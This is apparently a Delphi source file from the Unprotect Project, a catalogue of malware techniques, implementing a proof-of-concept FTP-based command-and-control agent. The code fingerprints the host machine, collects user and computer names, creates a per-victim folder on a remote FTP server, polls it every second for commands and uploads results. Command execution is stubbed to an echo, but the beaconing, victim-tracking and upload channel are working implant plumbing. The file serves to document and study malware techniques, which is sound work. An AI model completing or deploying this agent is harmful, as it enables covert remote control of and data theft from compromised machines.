















(*
 * =========================================================================================
 * www.unprotect.it (Unprotect Project)
 * Author:   Jean-Pierre LESUEUR (@DarkCoderSc)
 * =========================================================================================
 *)

  // WinApi Documentation
  // https://learn.microsoft.com/en-us/windows/win32/wininet/ftp-sessions?FWT_mc_id=DSEC-MVP-5005282

program FtpC2;

{$APPTYPE CONSOLE}

uses Winapi.Windows,
     Winapi.WinInet,
     System.Classes,
     System.SysUtils,
     System.IOUtils,
     System.hash;

type
  EFtpException = class(Exception);

  EWindowsException = class(Exception)
  private
    FLastError : Integer;
  public
    {@C}
    constructor Create(const WinAPI : String); overload;

    {@G}
    property LastError : Integer read FLastError;
  end;

  TDaemon = class(TThread)
  private
    FAgentSession : TGUID;
    FFtpHost      : String;
    FFtpPort      : Word;
    FFtpUser      : String;
    FFtpPassword  : String;
  protected
    procedure Execute(); override;
  public
    {@C}
    constructor Create(const AFtpHost, AFtpUser, AFtpPassword : String; const AFtpPort : Word = INTERNET_DEFAULT_FTP_PORT); overload;
  end;

  TFtpHelper = class
  private
    FInternetHandle : HINTERNET;
    FFtpHandle      : HINTERNET;

    FFtpHost        : String;
    FFtpPort        : Word;
    FFtpUser        : String;
    FFtpPassword    : String;

    {@M}
    function IsConnected() : Boolean;
    procedure CheckConnected();
  public
    {@M}
    procedure Connect();
    procedure Disconnect();

    procedure Browse(const ADirectory : String);

    procedure UploadStream(var AStream : TMemoryStream; const AFileName : String);
    function DownloadStream(const AFileName : String) : TMemoryStream;

    procedure UploadString(const AContent, AFileName : String);
    function DownloadString(const AFileName : String) : String;

    function GetCurrentDirectory() : String;
    procedure SetCurrentDirectory(const APath : String);

    function DirectoryExists(const ADirectory : String) : Boolean;
    procedure CreateDirectory(const ADirectoryName : String; const ADoBrowse : Boolean = False);
    procedure CreateOrBrowseDirectory(const ADirectoryName : String);
    procedure DeleteFile(const AFileName : String);

    {@C}
    constructor Create(const AFtpHost : String; const AFtpPort : Word; const AFtpUser, AFtpPassword : String; const AAgent : String = 'FTP'); overload;
    constructor Create(const AFtpHost, AFtpUser, AFtpPassword : String) overload;

    destructor Destroy(); override;

    {@G}
    property Connected : Boolean read IsConnected;
  end;

(* EWindowsException *)

{ EWindowsException.Create }
constructor EWindowsException.Create(const WinAPI : String);
var AFormatedMessage : String;
begin
  FLastError := GetLastError();

  AFormatedMessage := Format('___%s: last_err=%d, last_err_msg="%s".', [
      WinAPI,
      FLastError,
      SysErrorMessage(FLastError)
  ]);

  // [+] ERROR_INTERNET_EXTENDED_ERROR

  ///
  inherited Create(AFormatedMessage);
end;

(* TFtpHelper *)

{ TFtpHelper.Create }
constructor TFtpHelper.Create(const AFtpHost : String; const AFtpPort : Word; const AFtpUser, AFtpPassword : String; const AAgent : String = 'FTP');
begin
  inherited Create();
  ///

  FFtpHost     := AFtpHost;
  FFtpPort     := AFtpPort;
  FFtpUser     := AFtpUser;
  FFtpPassword := AFtpPassword;

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw?FWT_mc_id=DSEC-MVP-5005282
  FInternetHandle := InternetOpenW(PWideChar(AAgent), INTERNET_OPEN_TYPE_DIRECT, nil, nil, 0);
  if not Assigned(FInternetHandle) then
    raise EWindowsException.Create('InternetOpenW');
end;

{ TFtpHelper.Create }
constructor TFtpHelper.Create(const AFtpHost, AFtpUser, AFtpPassword : String);
begin
  Create(AFtpHost, INTERNET_DEFAULT_FTP_PORT, AFtpuser, AFtpPassword);
end;

{ TFtpHelper.Destroy }
destructor TFtpHelper.Destroy();
begin
  self.Disconnect();
  ///

  if Assigned(FInternetHandle) then
    InternetCloseHandle(FInternetHandle);

  ///
  inherited Destroy();
end;

{ TFtpHelper.Connect }
procedure TFtpHelper.Connect();
begin
  if IsConnected() then
    self.Disconnect();
  ///

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetconnectw?FWT_mc_id=DSEC-MVP-5005282
  FFtpHandle := InternetConnectW(
    FInternetHandle,
    PWideChar(FFtpHost),
    FFtpPort,
    PWideChar(FFtpUser),
    PWideChar(FFtpPassword),
    INTERNET_SERVICE_FTP,
    INTERNET_FLAG_PASSIVE,
    0
  );

  if not Assigned(FFtpHandle) then
    raise EWindowsException.Create('InternetConnectW');
end;

{ TFtpHelper.Browse }
procedure TFtpHelper.Browse(const ADirectory: string);
begin
  CheckConnected();
  ///

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpsetcurrentdirectoryw?FWT_mc_id=DSEC-MVP-5005282
  if not FtpSetCurrentDirectoryW(FFtpHandle, PWideChar(ADirectory)) then
    raise EWindowsException.Create('FtpSetCurrentDirectoryW');
end;

{ TFtpHelper.UploadStream }
procedure TFtpHelper.UploadStream(var AStream : TMemoryStream; const AFileName : String);
var hFtpFile      : HINTERNET;
    ABytesRead    : Cardinal;
    ABuffer       : array[0..8192 -1] of byte;
    ABytesWritten : Cardinal;
    AOldPosition  : Cardinal;
begin
  CheckConnected();
  ///

  if not Assigned(AStream) then
    Exit();

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpopenfilew?FWT_mc_id=DSEC-MVP-5005282
  hFtpFile := FtpOpenFileW(FFtpHandle, PWideChar(AFileName), GENERIC_WRITE, FTP_TRANSFER_TYPE_BINARY, INTERNET_FLAG_RELOAD);
  if not Assigned(hFtpFile) then
    raise EWindowsException.Create('FtpOpenFileW');
  try
    if AStream.Size = 0 then
      Exit();
    ///

    AOldPosition := AStream.Position;

    AStream.Position := 0;
    repeat
      ABytesRead := AStream.Read(ABuffer, SizeOf(ABuffer));
      if ABytesRead = 0 then
        break;

      // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetwritefile?FWT_mc_id=DSEC-MVP-5005282
      if not InternetWriteFile(hFtpFile, @ABuffer, ABytesRead, ABytesWritten) then
        raise EWindowsException.Create('InternetWriteFile');


    until (ABytesRead = 0);

    ///
    AStream.Position := AOldPosition;
  finally
    InternetCloseHandle(hFtpFile);
  end;
end;

{ TFtpHelper.DownloadStream }
function TFtpHelper.DownloadStream(const AFileName : String) : TMemoryStream;
var hFtpFile   : HINTERNET;
    ABuffer    : array[0..8192 -1] of byte;
    ABytesRead : Cardinal;
begin
  result := nil;
  ///

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile?FWT_mc_id=DSEC-MVP-5005282
  hFtpFile := FtpOpenFileW(FFtpHandle, PWideChar(AFileName), GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, INTERNET_FLAG_RELOAD);
  if not Assigned(hFtpFile) then
    raise EWindowsException.Create('FtpOpenFileW');
  try
    result := TMemoryStream.Create();
    ///

    while true do begin
      if not InternetReadFile(hFtpFile, @ABuffer, SizeOf(ABuffer), ABytesRead) then
        break;

      if ABytesRead = 0 then
        break;

      result.Write(ABuffer, ABytesRead);

      if ABytesRead <> SizeOf(ABuffer) then
        break;
    end;

    ///
    result.Position := 0;
  finally
    InternetCloseHandle(hFtpFile);
  end;
end;

{ TFtpHelper.UploadString }
procedure TFtpHelper.UploadString(const AContent, AFileName : String);
var AStream       : TMemoryStream;
    AStreamWriter : TStreamWriter;
begin
  AStreamWriter := nil;
  ///

  AStream := TMemoryStream.Create();
  try
    AStreamWriter := TStreamWriter.Create(AStream, TEncoding.UTF8);
    ///

    AStreamWriter.Write(AContent);

    ///
    self.UploadStream(AStream, AFileName);
  finally
    if Assigned(AStreamWriter) then
      FreeAndNil(AStreamWriter)
    else if Assigned(AStream) then
      FreeAndNil(AStreamWriter);
  end;
end;

{ TFtpHelper.DownloadString }
function TFtpHelper.DownloadString(const AFileName : String) : String;
var AStream       : TMemoryStream;
    AStreamReader : TStreamReader;
begin
  result := '';
  ///

  AStreamReader := nil;
  ///

  AStream := self.DownloadStream(AFileName);
  if not Assigned(AStream) then
    Exit();
  try
    AStreamReader := TStreamReader.Create(AStream, TEncoding.UTF8);

    ///
    result := AStreamReader.ReadToEnd();
  finally
    if Assigned(AStreamReader) then
      FreeAndNil(AStreamReader)
    else if Assigned(AStream) then
      FreeAndNil(AStream);
  end;
end;

{ TFtpHelper.GetCurrentDirectory }
function TFtpHelper.GetCurrentDirectory() : String;
var ALength : DWORD;
begin
  CheckConnected();
  ///

  result := '';

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpgetcurrentdirectoryw?FWT_mc_id=DSEC-MVP-5005282
  if not FtpGetCurrentDirectoryW(FFtpHandle, nil, ALength) then
    if GetLastError() <> ERROR_INSUFFICIENT_BUFFER then
      raise EWindowsException.Create('FtpGetCurrentDirectory(__call:1)');

  SetLength(result, ALength div SizeOf(WideChar));

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpgetcurrentdirectoryw?FWT_mc_id=DSEC-MVP-5005282
  if not FtpGetCurrentDirectoryW(FFtpHandle, PWideChar(result), ALength) then
    raise EWindowsException.Create('FtpGetCurrentDirectory(__call:2)');
end;

{ TFtpHelper.SetCurrentDirectory }
procedure TFtpHelper.SetCurrentDirectory(const APath : String);
begin
  CheckConnected();
  ///

  if not FtpSetCurrentDirectoryW(FFtpHandle, PWideChar(APath)) then
    raise EWindowsException.Create('FtpSetCurrentDirectoryW');
end;

{ TFtpHelper.DirectoryExists }
function TFtpHelper.DirectoryExists(const ADirectory : String) : Boolean;
var AOldDirectory : String;
begin
  CheckConnected();
  ///

  result := False;

  AOldDirectory := self.GetCurrentDirectory();
  try
    SetCurrentDirectory(ADirectory);
    try
      result := True;
    finally
      SetCurrentDirectory(AOldDirectory);
    end;
  except
    //on E : Exception do
    //  writeln(e.Message);
    // [+] Check with "ERROR_INTERNET_EXTENDED_ERROR" status
  end;
end;

{ TFtpHelper.CreateDirectory }
procedure TFtpHelper.CreateDirectory(const ADirectoryName : String; const ADoBrowse : Boolean = False);
begin
  CheckConnected();
  ///

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpcreatedirectoryw?FWT_mc_id=DSEC-MVP-5005282
  if not FtpCreateDirectoryW(FFtpHandle, PWideChar(ADirectoryName)) then
    raise EWindowsException.Create('FtpCreateDirectory');

  if ADoBrowse then
    self.Browse(ADirectoryName);
end;

{ TFtpHelper.CreateOrBrowseDirectory }
procedure TFtpHelper.CreateOrBrowseDirectory(const ADirectoryName : String);
begin
  if self.DirectoryExists(ADirectoryName) then
    self.Browse(ADirectoryName)
  else
    self.CreateDirectory(ADirectoryName, True);
end;

{ TFtpHelper.DeleteFile }
procedure TFtpHelper.DeleteFile(const AFileName : String);
begin
  CheckConnected();
  ///

  // https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpdeletefilew?FWT_mc_id=DSEC-MVP-5005282
  if not FtpDeleteFileW(FFtpHandle, PWideChar(AFileName)) then
    raise EWindowsException.Create('FtpDeleteFileW');
end;

{ TFtpHelper.CheckConnected }
procedure TFtpHelper.CheckConnected();
begin
  if not IsConnected() then
    raise EFtpException.Create('Not connected to FTP Server.');
end;

{ TFtpHelper.Disconnect }
procedure TFtpHelper.Disconnect();
begin
  if Assigned(FFtpHandle) then
    InternetCloseHandle(FFtpHandle);
end;

{ TFtpHelper.IsConnected }
function TFtpHelper.IsConnected() : Boolean;
begin
  result := Assigned(FFtpHandle);
end;

(* TDaemon *)

{ TDaemon.Create }
constructor TDaemon.Create(const AFtpHost, AFtpUser, AFtpPassword : String; const AFtpPort : Word = INTERNET_DEFAULT_FTP_PORT);

  function GetMachineId() : TGUID;
  var ARoot                 : String;
      AVolumeNameBuffer     : String;
      AFileSystemNameBuffer : String;
      ADummy                : Cardinal;
      ASerialNumber         : DWORD;
      AHash                 : TBytes;
  begin
    ARoot := TPath.GetPathRoot(TPath.GetHomePath());
    ///

    SetLength(AVolumeNameBuffer, MAX_PATH +1);
    SetLength(AFileSystemNameBuffer, MAX_PATH +1);
    try
      // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getvolumeinformationw?FWT_mc_id=DSEC-MVP-5005282
      if not GetVolumeInformationW(
        PWideChar(ARoot),
        PWideChar(AVolumeNameBuffer),
        Length(AVolumeNameBuffer),
        @ASerialNumber,
        ADummy,
        ADummy,
        PWideChar(AFileSystemNameBuffer),
        Length(AFileSystemNameBuffer)
      ) then
        Exit(TGUID.Empty);
      ///

      // Tiny but efficient trick to generate a fake GUID from a MD5 (32bit Hex Long)
      AHash := THashMD5.GetHashBytes(IntToStr(ASerialNumber));

      result := TGUID.Create(Format('{%.8x-%.4x-%.4x-%.4x-%.4x%.8x}', [
        PLongWord(@AHash[0])^,
        PWord(@AHash[4])^,
        PWord(@AHash[6])^,
        PWord(@AHash[8])^,
        PWord(@AHash[10])^,
        PLongWord(@AHash[12])^
      ]));
    finally
      SetLength(AVolumeNameBuffer, 0);
      SetLength(AFileSystemNameBuffer, 0);
    end;
  end;

begin
  inherited Create(False);
  ///

  FFtpHost     := AFtpHost;
  FFtpPort     := AFtpPort;
  FFtpUser     := AFtpUser;
  FFtpPassword := AFtpPassword;

  ///
  FAgentSession := GetMachineId();
end;

{ TDaemon.Execute }
procedure TDaemon.Execute();
var AFtp           : TFtpHelper;
    ACommand       : String;
    AContextPath   : String;
    AUserDomain    : String;
    ACommandResult : String;


const STR_COMMAND_PLACEHOLDER = '__command__';

type
  TWindowsInformationKind = (
    wikUserName,
    wikComputerName
  );

    { _.GetWindowsInformation }
    function GetWindowsInformation(const AKind : TWindowsInformationKind = wikUserName) : String;
    var ALength : cardinal;
    begin
      ALength := MAX_PATH + 1;

      SetLength(result, ALength);

      case AKind of
        wikUserName:
          // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea?FWT_mc_id=DSEC-MVP-5005282
          if not GetUserNameW(PWideChar(result), ALength) then
            raise EWindowsException.Create('GetUserNameW');
        wikComputerName:
          // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getcomputernamew?FWT_mc_id=DSEC-MVP-5005282
          if not GetComputerNameW(PWideChar(result), ALength) then
              raise EWindowsException.Create('GetComputerNameW');
      end;

      ///
      SetLength(result, ALength);

      result := Trim(result);
    end;

begin
  AFtp := TFtpHelper.Create(FFtpHost, FFtpPort, FFtpUser, FFtpPassword);
  try
    AUserDomain := Format('%s@%s', [
      GetWindowsInformation(),
      GetWindowsInformation(wikComputerName)]
    );

    AContextPath := Format('%s/%s', [
      FAgentSession.ToString(),
      AUserDomain
    ]);
    ///

    while not Terminated do begin
      ACommand := '';
      try
        AFtp.Connect();
        try
          // Create remote directory tree
          try
            AFtp.CreateOrBrowseDirectory(FAgentSession.ToString());

            AFtp.CreateOrBrowseDirectory(AUserDomain);
          except end;

          // Retrieve dedicated command
          try
            ACommand := AFtp.DownloadString(STR_COMMAND_PLACEHOLDER);
          except end;

          // Echo-back command result
          if not String.IsNullOrEmpty(ACommand) then begin
            // ... PROCESS ACTION / COMMAND HERE ... //
            // ...

            ACommandResult := Format('This is just a demo, so I echo-back the command: "%s".', [ACommand]);

            AFtp.UploadString(ACommandResult, Format('result.%s', [
              FormatDateTime('yyyy-mm-dd-hh-nn-ss', Now)])
            );

            // Delete the command file when processed
            try
              AFtp.DeleteFile(STR_COMMAND_PLACEHOLDER);
            except end;
          end;
        finally
          AFtp.Disconnect(); // We are in beacon mode
        end;
      except
        on E : Exception do
          WriteLn(Format('Exception: %s', [E.Message]));
      end;

      ///
      Sleep(1000);
    end;
  finally
    if Assigned(AFtp) then
      FreeAndNil(AFtp);

    ///
    ExitThread(0); //!important
  end;
end;

(* Code *)

procedure main();
var ADaemon : TDaemon;
begin
  ADaemon := TDaemon.Create('ftp.localhost', 'dark', 'toor');

  readln;
end;

(* EntryPoint *)
begin
  main();

end.



